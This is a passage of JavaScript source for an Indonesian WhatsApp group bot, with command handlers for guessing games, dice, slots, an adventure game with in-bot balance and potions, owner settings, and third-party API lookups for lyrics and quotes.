case 'tebakkata': case 'tk':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isTebakKata(from, tebakkata)) return textImg(`Masih ada soal yang belum di selesaikan`)
let datakata = fs.readFileSync('./database/data/tebakkata.js')
let tebakata = JSON.parse(datakata)
let tbkata = Math.floor(Math.random() * tebakata.length);
let Randkey = tebakata[tbkata]
textImg(`*JAWABLAH SOAL BERIKUT*

*Soal :* ${Randkey.result.soal}

Waktu : ${gamewaktu}s`)
let tkata = Randkey.result.jawaban.toLowerCase()
game.addkata(from, tkata, gamewaktu, tebakkata)
gameAdd(sender, glimit)
break

case 'tkm':case 'tebakkimia':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (gamemode === 'false'){
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
 if (game.isTebakKimia(from, tebakkimia)) return textImg(`Masih ada soal yang belum di selesaikan`)
let datakimia = fs.readFileSync('./database/data/tebakkimia.js')
let tebakimia = JSON.parse(datakimia)
let tkimia = Math.floor(Math.random() * tebakimia.length);
let RandUnsur = tebakimia[tkimia]
textImg(`*JAWABLAH SOAL BERIKUT*

*Soal :* Lambang unsur ${RandUnsur.result.unsur}

Waktu : ${gamewaktu}s`)
let ahhh = RandUnsur.result.lambang.toLowerCase()
game.addkimia(from, ahhh, gamewaktu, tebakkimia)
gameAdd(sender, glimit)
}
if (gamemode === 'true'){
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isTebakKimia(from, tebakkimia)) return textImg(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/tebak/unsurkimia?apikey=${lolkey}`)
textImg(`*JAWABLAH SOAL BERIKUT*

*Soal :* Lambang unsur ${anu.data.result.nama} adalah?

Waktu : ${gamewaktu}s`)
let revasayank = anu.data.result.lambang.toLowerCase()
game.addkimia(from, revasayank, gamewaktu, tebakkimia)
gameAdd(sender, glimit)
}
break
case 'tebaklagu': case 'tlagu':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isTebakLagu(from, tebaklagu)) return textImg(`Masih ada soal yang belum di selesaikan`)
let res1 = await axios.get(`https://api.xteam.xyz/game/tebaklagu?apikey=kurrxd09&id=4mFuArYRh3SO8jfffYLSER`) 
let kisi2 = res1.data.result.judul.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
textImg(`${S}Game Tebak Lagu${S}

Petunjuk : ${kisi2}
Waktu : ${gamewaktu}s`)
sendFileFromUrl(from, res1.data.result.preview, {contextInfo: {forwardingScore: 100, isForwarded: true}, quoted:msg})
//surya.sendMessage(from, await getBuffer(res1.result.data.preview), audio, {contextInfo: {forwardingScore: 100, isForwarded: true, mentionedJid: [sender]}, quoted:msg})
let anal = res1.data.result.judul.toLowerCase()
game.addlagu(from, anal, gamewaktu, tebaklagu)
gameAdd(sender, glimit)
}
break

case 'canceltebaklagu':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
tebaklagu.splice(game.getTLGPosi(from, tebaklagu), 1)
textImg(`Success mengcancel game tebak lagu sebelumnya`)
break

case 'tebakanime': case 'ta':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isTebakAnime(from, tebakanime)) return textImg(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/tebakchara?apikey=${lolkey}`)
const petunjuk = anu.data.result.name.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
sendFileFromUrl(from, anu.data.result.image, monospace(`Silahkan tebak karakter anime berikut ini

Petunjuk : ${petunjuk}

Waktu : ${gamewaktu}s`), msg)
let nurulsayank = anu.data.result.name.toLowerCase()
game.addanime(from, nurulsayank, gamewaktu, tebakanime)
gameAdd(sender, glimit)
}
break
case 'tebakjenaka': case 'tj':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isTebakJenaka(from, tebakjenaka)) return textImg(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/tebak/jenaka?apikey=${lolkey}`)
const petunjuk = anu.data.result.answer.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
textImg(`*JAWABLAH SOAL BERIKUT*

*Soal :* ${anu.data.result.question}

Petunjuk : ${petunjuk}

Waktu : ${gamewaktu}s`)
let anak = anu.data.result.answer.toLowerCase()
game.addjenaka(from, anak, gamewaktu, tebakjenaka)
gameAdd(sender, glimit)
}
break

case 'tebakbendera': case 'tb':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
if (game.isTebakBendera(from, tebakbendera)) return textImg(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/tebak/bendera?apikey=${lolkey}`)
//const petunjuk = anu.data.result.name.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '_')
textImg(`*JAWABLAH SOAL BERIKUT*

*Soal :* Bendera negara manakah itu ${anu.data.result.flag}

Waktu : ${gamewaktu}s`)
let ikasayank = anu.data.result.name.toLowerCase()
game.addbendera(from, ikasayank, gamewaktu, tebakbendera)
gameAdd(sender, glimit)
}
break

case 'dadu':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
if (args.length > 2) return reply(`Penggunaan ${command} angka atau ${command} (Jika mendapat angka 6 akan mendapatkan balance)`)
let dadu = ["1", "2", "3", "4", "5", "6"];
let isDadu = dadu.includes(q)
let hadiaq = randomNomor(1000)
let rend = dadu[Math.floor(Math.random() * (dadu.length))]
await surya.sendMessage(from, fs.readFileSync(`./media/filebot/${rend}.webp`), sticker, { quoted: msg })
gameAdd(sender, glimit)
if (rend === "6"){
textImg(`Selamat ${pushname}, mendapatkan angka 6 dan mendapatkan $${hadiaq} balance`)
addBalance(sender, hadiaq, balance)
 }
break
case 'slot':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (!isLevelingOn) return reply(`Fitur leveling belum diaktifkan!`)
if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
const sotoy = ['🍊 : 🍒 : 🍐','🍒 : 🔔 : 🍊','🍇 : 🍒 : 🍐','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔','🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇','🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌','🍇 : 🍇 : 🍇']
const somtoy = sotoy[Math.floor(Math.random() * (sotoy.length))]
const somtoyy = sotoy[Math.floor(Math.random() * (sotoy.length))]
const somtoyyy = sotoy[Math.floor(Math.random() * (sotoy.length))]
if (somtoyy== '🍌 : 🍌 : 🍌') {
 mentions(`[🎰 | *SLOTS* ]\n-----------------\n${somtoy}\n${somtoyy} <=====\n${somtoyyy}\n-----------------\n[🎰 | *YOU WIN @${sender.split('@')[0]}* ]\n\nYou Get *$500 Balance*`, [sender], true)
addBalance(sender, '500', balance)
 } else if (somtoyy == '🍒 : 🍒 : 🍒') {
 mentions(`[🎰 | *SLOTS* ]\n-----------------\n${somtoy}\n${somtoyy} <=====\n${somtoyyy}\n-----------------\n[🎰 | *YOU WIN @${sender.split('@')[0]}* ]\n\nYou Get *$500 Balance*`, [sender], true)
addBalance(sender, '500', balance)
 } else if (somtoyy == '🔔 : 🔔 : 🔔') {
 mentions(`[🎰 | *SLOTS* ]\n-----------------\n${somtoy}\n${somtoyy} <=====\n${somtoyyy}\n-----------------\n[🎰 | *YOU WIN @${sender.split('@')[0]}* ]\n\nYou Get *$500 Balance*`, [sender], true)
addBalance(sender, '500', balance)
 } else if (somtoyy == '🍐 : 🍐 : 🍐') {
 mentions(`[🎰 | *SLOTS* ]\n-----------------\n${somtoy}\n${somtoyy} <=====\n${somtoyyy}\n-----------------\n[🎰 | *YOU WIN @${sender.split('@')[0]}* ]\n\nYou Get *$500 Balance*`, [sender], true)
addBalance(sender, '500', balance)
 } else if (somtoyy == '🍇 : 🍇 : 🍇') {
 mentions(`[🎰 | *SLOTS* ]\n-----------------\n${somtoy}\n${somtoyy} <=====\n${somtoyyy}\n-----------------\n[🎰 | *YOU WIN @${sender.split('@')[0]}* ]\n\nYou Get *$500 Balance*`, [sender], true)
addBalance(sender, '300', balance)
 } else {
 mentions(`[🎰 | *SLOTS* ]\n-----------------\n${somtoy}\n${somtoyy} <=====\n${somtoyyy}\n-----------------\n[🎰 | *YOU LOST @${sender.split('@')[0]}* ]\n\n Balance kamu berkurang $250`, [sender], true)
kurangBalance(sender, '250', balance)
 }
gameAdd(sender, glimit)
break
case 'buypotion':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (args.length < 2) return reply(`Kirim perintah *${prefix}buypotion* jumlah potion yang ingin dibeli

Harga 1 potion = $1000 balance`)
if (args[1].includes('-')) return reply(`Jangan menggunakan -`)
if (isNaN(args[1])) return reply(`Harus berupa angka`)
let pots = Number(nebal(args[1]) * 1000)
if (getBalance(sender, balance) < pots) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
kurangBalance(sender, pots, balance)
addPotioUser(sender, args[1])
reply(monospace(`Pembeliaan potion sebanyak ${args[1]} berhasil`))
break

case 'usepotion':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (!q) return textImg(`Masukkan angka`)
const healperpotion = 1
const pot = healperpotion * 1
if (isPotion(sender)) return reply(`maaf potion kamu belum mencukupi. silahkan kumpulkan dan beli nanti`)
potionAdd(sender, pot)
addHealUser(sender, 25)
textImg(`*「 PEMBAYARAN BERHASIL 」*

*Pengirim* : Surya
*penerima* : ${pushname}
*nominal pembelian* : ${q}
*Harga* : ${healperpotion}/25heal`) 
break
case 'potion': 
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
checkPotion(sender)
break
case 'heal': 
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
checkHeal(sender)
break
case 'adventure':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
let ngab = ['Dinda','Longsor','Letusan Gunung','Tsunami','Gempa Bumi','Meteor','Demon']
const sesuatu = ngab[Math.floor(Math.random() * ngab.length)]
reply(`@${sender.split('@')[0]} Sedang Berpetualang`, {contextInfo: {"mentionedJid": [sender]}})
setTimeout( () => {
reply(`Tiba Tiba Ada ${sesuatu}`, {contextInfo: {"mentionedJid": [sender]}})
}, 5000)
setTimeout( () => {
reply(`AWAS!! @${sender.split('@')[0]}`, {contextInfo: {"mentionedJid": [sender]}})
}, 8000)
const dungeon =['Land Of Down','Whetstone','Willow Field','Rodeo','Verdant Blufs','Bull Holland','Fallen Tree','Dellnort','Verona Lush','Leafy Hollow','Chilliad Dome','Garcia','Pine Valley','Santa Florals','Guvero East','Cranbarry','Junever','Aldea Malvada','Green Palms','Green Oasis','Fort Carson','Prickel Pine','Pilson Meadow','Boca Roca','Rocksore East','Camel Toe','Hanky Panky','Fern Ridge','Montgomerry','Flint Yankton','Vespucci','fortress city', 'ravines valley', 'horizon valley', 'cyber city', 'end city', 'templar city', 'pochinki', 'peak','Vertical Zone','Sentainel Country','Night City','Flush City','Royals Canyon','Blackburn','Peterborough','Tarnstead','Jarren’s','Outpost','Landow','Nearon','Kincardine','Aysgarth','Veritas','Openshaw','Bredwardine','Berkton','Wolford','Norwich','Kald','Solaris','Kilead','Pitmerden','Acomb','Eldham','Warcester','Lingmell','Kilead','Cromerth','Wingston','Garmsby','Kingcardine','Perthlochry','Frostford','Hillford','Hardersfield','Tarrin','Holmfirth','Caerleon','Elisyum','Ballaeter','Penshaw','Bradford','Wigston','Accreton','Kameeraska','Ferncombe','Kilerth','Erostey','Carran','Jongvale','Larnwick','Queenstown','Whaelrdrake','Baerney','Wingston','Arkney','Strongfair','Lowestoft','Beggar’s Hole','Shepshed','Perthlochry','Ironforge','Tywardreath','Pontheugh','Foolshope','Hull','Dalmerlington','Aucteraden','Woodpine','Millstone','Windermere','Lancaster','Kirkwall','Rotherhithe','Astrakhan','Watford','Ritherhithe','Krosstoen','Pella’s','Wish','Grimsby','Ayrith','Ampleforth','Skystead','Eanverness','Penshaw','Peatsland','Astrakane','Pontybridge','Caershire','Snowbush','Sutton','Northwich','Hogsfeet','Claethorpes','Sudbury','Cherrytown','Blue Field','Orrinshire','Aempleforth','Garrigill','Jedburgh','Eastbourne','Taedmorden','Venzor','Grasmere','Ubbin','Falls','Violl’s Garden','Glanchester','Bailymena','Arkkukari','Skargness','Cardend','Llanybydder','Faversham','Yellowseed','Carlisle','Cirencester','Aramoor','Furness','Kincardine','Rotherham','Emelle','Boroughton','Carran','Ffestiniog','Mansfield','Huthwaite','Marclesfield','Pavv','Squall’s End','Glenarm','Dragontail','Moressley','Hardersfield','Gilramore','Aria','Ecrin','Clare View Point','Blackburn','Oakheart','Doonatel','Broughton','Carlisle','Murlayfield','Nuxvar']
const ad = dungeon[Math.floor(Math.random() * dungeon.length)]
let anu = fs.readFileSync('./database/adventure/dungeon.js');
let jsonAnu = JSON.parse(anu);
let randIndex = Math.floor(Math.random() * jsonAnu.length);
let randKey = jsonAnu[randIndex];
let hasil = await getBuffer(randKey.result)
const amountExp = Math.floor(Math.random() * (15 - 25 + 1) + 20)
level.addLevelingXp(sender, amountExp, _level)
const money = Math.ceil(Math.random() * 1000)
addBalance(sender, money, balance)
const poti = Math.ceil(Math.random() * 5)
addPotioUser(sender, poti)
let adture = await surya.prepareMessage(from, hasil, location, {thumbnail: hasil})
await sleep(8100)
const buttonsa = [{buttonId: 'adventure', buttonText: {displayText: '➡️ Lanjut Berpetualang'}, type: 1}]
const buttonMessage = {
locationMessage: adture.message.locationMessage,
contentText: `
*──「 DEATH 」──*

◪
├─❑ *Name : ${pushname}*
├─❑ *Tag : @${sender.split('@')[0]}*
├─❏ *Tempat : ${ad}*
├─❏ *Balance : $${money}*
├─❏ *EXP : ${amountExp} Exp*
└─❏ *Potion : ${poti}*`,
footerText: `© ᴄʀᴇᴀᴛᴇᴅ ᴍᴇᴄʜᴀ ʙᴏᴛᴢ ʙʏ @${Suryaa.split('@')[0]}`,
buttons: buttonsa,
headerType: 6
}
surya.sendMessage(from, buttonMessage, MessageType.buttonsMessage, {contextInfo :{text: 'hi',
"forwardingScore": 1000000000,
isForwarded: true,
sendEphemeral: true,
"externalAdReply": {
"title": `Creator Mecha Botz`,
"body": "Jabal Surya Ngalam",
"previewType": "PHOTO",
"thumbnailUrl": "https://i.ibb.co/Pt0wv6V/4cc3fc551dbd.jpg",
"thumbnail": "https://i.ibb.co/Pt0wv6V/4cc3fc551dbd.jpg",
"sourceUrl": "https://www.instagram.com/surya_skylark05"
},mentionedJid:[Suryaa, sender, '0@s.whatsapp.net']}, quoted : ftroli})
await gameAdd(sender, glimit)
await healAdd(sender)
break

case 'gelud':
if (isGame(sender, isPremium, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
if (!isGroup) return reply(mess.only.group)
if (msg.message.extendedTextMessage.contextInfo.mentionedJid > 1) return reply('Hanya bisa dengan 1 orang')
if (!msg.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
if (args.length === 0) return reply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
if (fs.existsSync(`./media/${from}.json`)) return reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan\nKetik *${prefix}delsesigelud*, untuk menghapus sesi`)
var gelutSkuy = setGelud(`${from}`)
gelutSkuy.status = false
gelutSkuy.Z = sender.replace("@s.whatsapp.net", "")
gelutSkuy.Y = args[0].replace("@", "")
fs.writeFileSync(`./media/${from}.json`, JSON.stringify(gelutSkuy, null, 2))
let starGame = `👑 Memulai Game Baku Hantam ????

• @${sender.replace("@s.whatsapp.net", "")} Menantang Bergelud${args[1]} 
Ketik Y/T untuk menerima atau menolak permainan`

surya.sendMessage(from, starGame, text, {quoted: ftroli, contextInfo: { mentionedJid: [sender, args[1].replace("@", "") + "@s.whatsapp.net"]}})
gameAdd(sender, glimit)
break
case 'delsesigelud':
if (!isGroup) return reply(mess.only.group)
if (fs.existsSync('./media/' + from + '.json')) {
fs.unlinkSync('./media/' + from + '.json')
reply('Berhasil Menghapus Sesi Gelud')
} else {
reply('Tidak ada sesi yang berlangsung')
}
break

case 'suit':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isGroup)return reply(mess.OnlyGrup)
if (isGame(sender, isOwner, gcount, glimit)) return reply(`Limit game kamu sudah habis`)
if (args.length < 2) return reply(`Penggunaan ${command} gunting/kertas/batu\n\nContoh : ${command} gunting`)
let suit = ["gunting", "batu", "kertas"];
let isSuit = suit.includes(q)
if (isSuit){
let suit1 = suit[Math.floor(Math.random() * (suit.length))]
let hadi = randomNomor(1000)
if (q === suit[0]){
if (suit1 === "gunting"){
reply(`Kamu ${q}\nMecha ${suit1}\n\nseri`)
} else if (suit1 === "batu"){
reply(`Kamu ${q}\nMecha ${suit1}\n\nKamu kalah`)
} else {
reply(`Kamu ${q}\nMecha ${suit1}\n\nKamu menang\n\nHadiah : $${hadi} balance`)
addBalance(sender, hadi, balance)
}
} else if (q === suit[1]){
if (suit1 === "batu"){
reply(`Kamu ${q}\nMecha ${suit1}\n\nSeri`)
} else if (suit1 === "kertas"){
reply(`Kamu ${q}\nMecha ${suit1}\n\nKamu kalah`)
} else {
reply(`Kamu ${q}\nMecha ${suit1}\n\nKamu menang\n\nHadiah : ${hadi} balance`)
addBalance(sender, hadi, balance)
}
} else if (q === suit[2]){
if (suit1 === "kertas"){
reply(`Kamu ${q}\nMecha ${suit1}\n\nSeri`)
} else if (suit1 === "gunting"){
reply(`Kamu ${q}\nMecha ${suit1}\n\nKamu kalah`)
} else {
reply(`Kamu ${q}\nMecha ${suit1}\n\nKamu menang\n\nHadiah : ${hadi} balance`)
addBalance(sender, hadi, balance)
}
}
gameAdd(sender, glimit)
} else {
reply(body.replace(args[1], "*"+args[1]+"*")+'\n\n'+`Tidak ada pilihan ${args[1]}`+`\nContoh : ${command} gunting`)
}
break
case 'setthumb':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (!isOwner && !isOwner2 && !fromMe)return mentions(mess.OnlySurya, [Suryaa], true)
if (!isQuotedImage) return reply('Reply imagenya yank')
const messimagethumb = JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
const downiamgethumb = await surya.downloadMediaMessage(messimagethumb)
fs.unlinkSync(`${setting.pathImg}`)
await sleep(2000)
fs.writeFileSync(`${setting.pathImg}`, downiamgethumb)
reply('Succes')
break

case 'setnameo2': case 'setnameowner2':
if (!isOwner && !isOwner2 && !fromMe)return mentions(mess.OnlySurya, [Suryaa], true)
if (!q) return textImg(`Text nya mana Surya?`)
MechaName = q
Flink(`Succes Mengganti Nama Owner 2 menjadi ${q}`)
break

case 'setgo':
if (!isOwner && !isOwner2 && !fromMe)return mentions(mess.OnlySurya, [Suryaa], true)
if (!q) return textImg(`Text nya mana Surya?`)
Mechagc = q
Flink(`Succes Mengganti Group Owner menjadi ${q}`)
break

case 'setharga':
if (!isOwner && !isOwner2 && !fromMe)return mentions(mess.OnlySurya, [Suryaa], true)
if (!q) return textImg(`Text nya mana Surya?`)
harganya = q
Flink(`Succes ${pushname}`)
break

case 'sethadiah':
if (!isOwner && !isOwner2 && !fromMe)return mentions(mess.OnlySurya, [Suryaa], true)
if (!q) return textImg(`Text nya mana Surya?`)
balanc = q
Flink(`Succes ${pushname}`)
break

case 'setsurya':
if (!isOwner && !isOwner2 && !fromMe)return mentions(mess.OnlySurya, [Suryaa], true)
if (!q) return textImg(`Nomornya mana?`)
if (mentioned.length !== 0){
for (let i = 0; i < mentioned.length; i++){
Suryaa = mentioned[0]
//Suryaa = hms
}
Flink(`Succes ${pushname}`)
}
break

case 'seto2': case 'setowner2':
if (!isOwner && !isOwner2 && !fromMe)return mentions(mess.OnlySurya, [Suryaa], true)
if (!q) return textImg(`Text nya mana Surya?`)
Mecha = q + '@s.whatsapp.net'
Flink(`Succes ${pushname}`)
break

case 'setgambar':
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (!isOwner) return mentions(mess.OnlySurya, [Suryaa], true)
if (!isQuotedImage) return reply('Reply imagenya yank')
const gethumb = JSON.parse(JSON.stringify(msg).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
const suryaimage = await surya.downloadMediaMessage(gethumb)
fs.unlinkSync(`${setting.suryaImg}`)
await sleep(2000)
fs.writeFileSync(`${setting.suryaImg}`, suryaimage)
reply('Succes')
break
case 'lirik':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (!isPremium) return sendButMessage(from, prem1, prem2, prem3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isGame(sender, isOwner, gcount, glimit)) return textImg(`Limit game kamu sudah habis`)
Flink(mess.wait)
let anu = await axios.get(`https://api.lolhuman.xyz/api/lirik?apikey=${lolkey}&query=${q}`)
textImg(`*Lirik lagu ${q} :*

 ${anu.data.result}`)
gameAdd(sender, glimit)
}
break
case 'carianime':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/character?apikey=${lolkey}&query=${q}`)
sendFileFromUrl(from, anu.data.result.image.large, monospace(`▢ Nama lengkap : ${anu.data.result.name.full}
▢ Nama asli : ${anu.data.result.name.native}
▢ Deskripsi : ${anu.data.result.description}`), msg)
limitAdd(sender, limit)
}
break
case 'namaninja':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/ninja?apikey=${lolkey}&nama=${q}`)
textImg(`Nama ninja *${q}* adalah :

▢ ${anu.data.result}`)
limitAdd(sender, limit)
}
break
case 'randombahasa':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/randombahasa?apikey=${lolkey}&text=${q}`)
textImg(`▢ ${anu.data.result}`)
limitAdd(sender, limit)
}
break
case 'quotesislami':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/quotes/islami?apikey=${lolkey}`)
textImg(`${anu.data.result}`)
limitAdd(sender, limit)
}
break
case 'quote':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/random/quotes?apikey=${lolkey}`)
textImg(`${anu.data.result.quote}`)
limitAdd(sender, limit)
}
break
case 'bucin2':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/random/bucin?apikey=${lolkey}`)
textImg(`${anu.data.result}`)
limitAdd(sender, limit)
}
break
case 'quotesdillan': case 'quotesdilan':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/quotes/dilan?apikey=${lolkey}`)
textImg(`${anu.data.result}`)
limitAdd(sender, limit)
reply(`Satu limit terpakai`)
}
break
case 'cerpen':{
if (!isRegister) return sendButMessage(from, daftar1, daftar2, daftar3, {"contextInfo": {mentionedJid: [Suryaa, sender, '0@s.whatsapp.net']}, quoted: msg})
if (isMuted) return
if (isBan) return 
if (isLimit(sender, isPremium, isOwner, limitCount, limit)) return reply (`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/cerpen?apikey=${lolkey}`)
textImg(`*▢ Judul :* ${anu.data.result.title}
*▢ Creator :* ${anu.data.result.creator}

